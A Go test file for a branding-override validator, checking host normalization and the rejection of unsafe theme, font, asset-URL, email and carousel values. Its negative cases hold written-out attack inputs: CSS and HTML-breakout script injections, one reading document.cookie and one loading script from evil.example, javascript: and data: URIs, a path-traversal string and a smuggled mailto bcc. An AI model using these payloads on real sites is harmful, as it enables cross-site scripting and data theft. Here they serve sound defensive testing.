package branding

import (
	"strings"
	"testing"
)

// NormalizeHost must agree byte-for-byte with normalizeBrandHost() in
// app/src/lib/serverBranding.ts. A row stored under a key that normalizes
// differently from the request host silently never matches, which presents as
// "the override does nothing" with no error anywhere.
func TestNormalizeHostMatchesFrontendRules(t *testing.T) {
	cases := map[string]string{
		"demo.partner.example.com":      "demo.partner.example.com",
		"DEMO.Partner.Example.COM":      "demo.partner.example.com",
		"demo.partner.example.com:3000": "demo.partner.example.com",
		"demo.partner.example.com.":     "demo.partner.example.com",
		"  demo.partner.example.com  ":  "demo.partner.example.com",
		"a.example.com, b.example.com":  "a.example.com",
		"[::1]:3000":                    "[::1]",
		"[::1]":                         "[::1]",
		"":                              "",
		"   ":                           "",
	}
	for in, want := range cases {
		if got := NormalizeHost(in); got != want {
			t.Errorf("NormalizeHost(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestValidateOverridesRejectsNonOverridableFields(t *testing.T) {
	// Asset URLs are excluded on purpose: they must resolve to files that exist
	// in the mounted kit, and only the mount can guarantee that.
	for _, field := range []string{"logoUrl", "faviconUrl", "nubiIconUrl", "signinImageUrl", "isWhiteLabel"} {
		if err := ValidateOverrides(map[string]any{field: "x"}); err == nil {
			t.Errorf("expected %q to be rejected as non-overridable", field)
		}
	}
}

func TestValidateOverridesAcceptsAllowedFields(t *testing.T) {
	err := ValidateOverrides(map[string]any{
		"title":         "Calsoft",
		"assistantName": "Calbee",
		"colorTokens":   map[string]any{"--nb-color-primary": "#0047AB", "--ds-brand-500": "#0047AB"},
		"theme":         map[string]any{"palette": map[string]any{"primary": "#0047AB"}},
		"fontRemap": []any{
			map[string]any{"family": "Poppins", "src": "url(/branding/acme/font.woff2) format('woff2')"},
		},
	})
	if err != nil {
		t.Fatalf("expected valid overrides to pass, got %v", err)
	}
}

func TestValidateOverridesRejectsEmpty(t *testing.T) {
	if err := ValidateOverrides(map[string]any{}); err == nil {
		t.Fatal("expected an empty override to be rejected")
	}
}

func TestValidateColorTokensRejectsUnknownTokenFamily(t *testing.T) {
	// useThemeProvider only applies --nb-* and --ds-*; anything else is dropped
	// on the client, so accepting it here would store a token that can never
	// take effect.
	if err := ValidateOverrides(map[string]any{"colorTokens": map[string]any{"--brand-primary": "#fff"}}); err == nil {
		t.Fatal("expected a non --nb-/--ds- token to be rejected")
	}
	if err := ValidateOverrides(map[string]any{"colorTokens": map[string]any{"--nb-color-primary": 123}}); err == nil {
		t.Fatal("expected a non-string token value to be rejected")
	}
}

// The font remap is interpolated into an injected @font-face rule. These are
// the byte sequences that would let a stored value close the declaration and
// inject arbitrary CSS.
func TestValidateFontRemapRejectsCSSInjection(t *testing.T) {
	bad := []map[string]any{
		{"family": "X'}body{display:none}@font-face{font-family:'Y", "src": "url(/a.woff2)"},
		{"family": "X", "src": "url(/a.woff2)};body{background:url(https://evil.example/x)}"},
		{"family": "X\"", "src": "url(/a.woff2)"},
		{"family": "X\\", "src": "url(/a.woff2)"},
		{"family": "X", "src": "url(/a.woff2)", "weight": "400;}body{color:red}"},
		{"family": "X", "src": "url(/a.woff2)", "style": "normal'"},
	}
	for i, entry := range bad {
		if err := ValidateOverrides(map[string]any{"fontRemap": []any{entry}}); err == nil {
			t.Errorf("case %d: expected CSS-injection payload to be rejected: %v", i, entry)
		}
	}
}

func TestValidateFontRemapRequiresFamilyAndSrc(t *testing.T) {
	if err := ValidateOverrides(map[string]any{"fontRemap": []any{map[string]any{"family": "X"}}}); err == nil {
		t.Fatal("expected a fontRemap entry without src to be rejected")
	}
	if err := ValidateOverrides(map[string]any{"fontRemap": []any{map[string]any{"src": "url(/a.woff2)"}}}); err == nil {
		t.Fatal("expected a fontRemap entry without family to be rejected")
	}
}

func TestValidateOverridesRejectsBlankTitle(t *testing.T) {
	if err := ValidateOverrides(map[string]any{"title": "   "}); err == nil {
		t.Fatal("expected a blank title to be rejected")
	}
	if err := ValidateOverrides(map[string]any{"assistantName": 42}); err == nil {
		t.Fatal("expected a non-string assistantName to be rejected")
	}
}

// The critical-CSS string is injected through dangerouslySetInnerHTML in
// _document.tsx, so a token value sits in an HTML context, not merely a CSS
// one. A value that closes the <style> element executes as script on every page
// of that host — including the signin page, which resolves branding before
// authentication and is therefore reachable by anyone who can resolve the
// hostname.
func TestValidateColorTokensRejectsHTMLBreakout(t *testing.T) {
	payloads := []string{
		"</style><script>alert(document.cookie)</script>",
		"#fff</style><script src=https://evil.example/x.js>",
		"<img src=x onerror=alert(1)>",
	}
	for _, p := range payloads {
		err := ValidateOverrides(map[string]any{"colorTokens": map[string]any{"--nb-color-primary": p}})
		if err == nil {
			t.Errorf("expected HTML-breakout payload to be rejected: %q", p)
		}
	}
}

func TestValidateFontRemapRejectsHTMLBreakout(t *testing.T) {
	entry := map[string]any{"family": "X", "src": "url(/a.woff2)</style><script>alert(1)</script>"}
	if err := ValidateOverrides(map[string]any{"fontRemap": []any{entry}}); err == nil {
		t.Fatal("expected an HTML-breakout payload in fontRemap.src to be rejected")
	}
}

// A malformed IPv6 literal must normalize identically on both sides. The JS
// slices to indexOf(']')+1, which is 0 when there is no closing bracket, so it
// yields "". A row stored under a key that normalized differently from the
// lookup would silently never match a request.
func TestNormalizeHostMalformedIPv6MatchesFrontend(t *testing.T) {
	if got := NormalizeHost("[::1"); got != "" {
		t.Errorf(`NormalizeHost("[::1") = %q, want "" to match normalizeBrandHost`, got)
	}
}

// The allow-list tracks theme.json: anything a mounted kit can express, an
// override can express too. A subset would force operators to remember which
// half of the brand lives where.
func TestValidateOverridesAcceptsThemeJsonAssetFields(t *testing.T) {
	err := ValidateOverrides(map[string]any{
		"logoUrl":              "/branding/acme/logo.svg",
		"faviconUrl":           "/favicon.ico",
		"k8sBeeUrl":            "/branding/acme/k8s.svg",
		"securityBeeUrl":       "/branding/acme/security.svg",
		"connectClusterGifUrl": "/branding/acme/connect.gif",
		"nubiIconCircleUrl":    "/branding/acme/circle.svg",
		"signinImageUrl":       "",
		"carouselSlides": []any{
			map[string]any{"title": "Cut cloud spend", "image": "/branding/acme/slide1.svg"},
		},
	})
	if err != nil {
		t.Fatalf("expected theme.json asset fields to be accepted, got %v", err)
	}
}

// Same-origin only. An absolute URL would let a stored row pull a partner's
// imagery from another host — brand hijack and a tracking pixel on every page,
// neither of which shows up in a diff.
func TestValidateAssetURLRejectsOffOrigin(t *testing.T) {
	bad := map[string]string{
		"absolute http":   "http://evil.example/logo.svg",
		"absolute https":  "https://evil.example/logo.svg",
		"scheme-relative": "//evil.example/logo.svg",
		"javascript uri":  "javascript:alert(1)",
		"data uri":        "data:image/svg+xml;base64,PHN2Zz4=",
		"traversal":       "/branding/../../etc/passwd",
		"bare relative":   "logo.svg",
		"quote breakout":  "/branding/a.svg\" onerror=alert(1)",
		"angle breakout":  "/branding/a.svg<script>",
		"whitespace":      "/branding/a b.svg",
	}
	for name, v := range bad {
		if err := ValidateOverrides(map[string]any{"logoUrl": v}); err == nil {
			t.Errorf("%s: expected %q to be rejected", name, v)
		}
	}
}

// Empty means "unset" and has to stay expressible: theme.json itself ships
// `"signinImageUrl": ""`, and clearing an asset back to its bundled default is
// a legitimate edit.
func TestValidateAssetURLAllowsEmptyToClear(t *testing.T) {
	if err := ValidateOverrides(map[string]any{"logoUrl": ""}); err != nil {
		t.Fatalf("expected an empty asset URL to be accepted as 'unset', got %v", err)
	}
}

// isWhiteLabel looks like an ordinary theme.json field, so a generic
// "not overridable" would read as a typo. It gets its own reason.
func TestValidateOverridesRejectsDerivedField(t *testing.T) {
	if err := ValidateOverrides(map[string]any{"isWhiteLabel": false}); err == nil {
		t.Fatal("expected isWhiteLabel to be refused")
	} else if !strings.Contains(err.Error(), "derived") {
		t.Errorf("isWhiteLabel rejection should explain it is derived, got: %v", err)
	}
}

func TestValidateOverridesAcceptsEmailBlock(t *testing.T) {
	ok := map[string]any{"email": map[string]any{
		"logoUrl":            "/branding/acme/logo.png",
		"supportEmail":       "support@acme.example.com",
		"primaryColor":       "#0047AB",
		"headerBgColor":      "rgb(0, 31, 77)",
		"footerBgColor":      "navy",
		"footerLinkColor":    "#fc0",
		"address":            "1 Acme Way, Anytown",
		"copyrightStartYear": float64(2024),
	}}
	if err := ValidateOverrides(ok); err != nil {
		t.Fatalf("expected a well-formed email block to be accepted, got %v", err)
	}
	if err := ValidateOverrides(map[string]any{"email": map[string]any{"supportEmail": ""}}); err != nil {
		t.Fatalf("expected an empty supportEmail to be accepted as 'hide it', got %v", err)
	}
}

// The email block is rendered into HTML mail: colours into inline style
// attributes, the address into the footer, the support address into a mailto.
func TestValidateOverridesRejectsUnsafeEmailValues(t *testing.T) {
	cases := map[string]map[string]any{
		"style breakout colour": {"primaryColor": "#fff;background:url(https://evil.example/x)"},
		"quote in colour":       {"headerBgColor": `red" onmouseover="x`},
		"html in address":       {"address": "<img src=https://evil.example/p.gif>"},
		"quote in address":      {"address": `a" style="display:none`},
		"not an email":          {"supportEmail": "support at acme"},
		"mailto breakout":       {"supportEmail": "a@b.com?bcc=evil@example.com"},
		"absolute logo":         {"logoUrl": "https://evil.example/logo.png"},
		"fractional year":       {"copyrightStartYear": float64(2024.5)},
		"string year":           {"copyrightStartYear": "2024"},
		"unknown field":         {"footerText": "hi"},
	}
	for name, email := range cases {
		if err := ValidateOverrides(map[string]any{"email": email}); err == nil {
			t.Errorf("%s: expected %v to be refused", name, email)
		}
	}
	if err := ValidateOverrides(map[string]any{"email": "support@acme.example.com"}); err == nil {
		t.Error("expected a non-object email value to be refused")
	}
}

func TestValidateCarouselSlidesRejectsBadEntries(t *testing.T) {
	cases := []any{
		[]any{map[string]any{"image": "https://evil.example/x.svg"}},
		[]any{map[string]any{"unexpected": "x"}},
		[]any{"not-an-object"},
		"not-an-array",
	}
	for i, c := range cases {
		if err := ValidateOverrides(map[string]any{"carouselSlides": c}); err == nil {
			t.Errorf("case %d: expected rejection for %#v", i, c)
		}
	}
}
